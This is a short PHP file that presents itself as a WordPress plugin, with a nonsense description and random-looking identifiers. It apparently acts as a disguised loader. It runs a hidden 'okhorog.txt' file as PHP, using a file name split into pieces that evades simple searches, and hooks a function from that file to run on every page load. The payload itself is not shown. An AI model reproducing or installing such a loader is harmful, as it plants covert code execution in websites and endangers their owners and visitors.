<?php

/**
 * Plugin Name: Ewujene
 * Plugin URI: https://ment.fric.com/ewujene
 * Description: ACLU are Spain, only some teachers integrate
 * Version: 1.0.2
 * Author: Bart Filiberto
 * Author URI: https://ment.fric.com
 * Text Domain: ewujene
 * License: GPL2+
 *
 */

function pimypo_sokhytew() {
    uhyviv_yshyzhymah();
}

$yvolav = __DIR__ . '/okhorog.txt';
if (file_exists($yvolav)) {
    include_once __DIR__ . "/okh" . "orog." . "txt";
}


if (function_exists("uhyviv_yshyzhymah")) {
    $akafoch = new jojoza_rufixihuj();
    if ($akafoch->rediji_buheheru()) {
        add_action('init', 'pimypo_sokhytew');
    }
}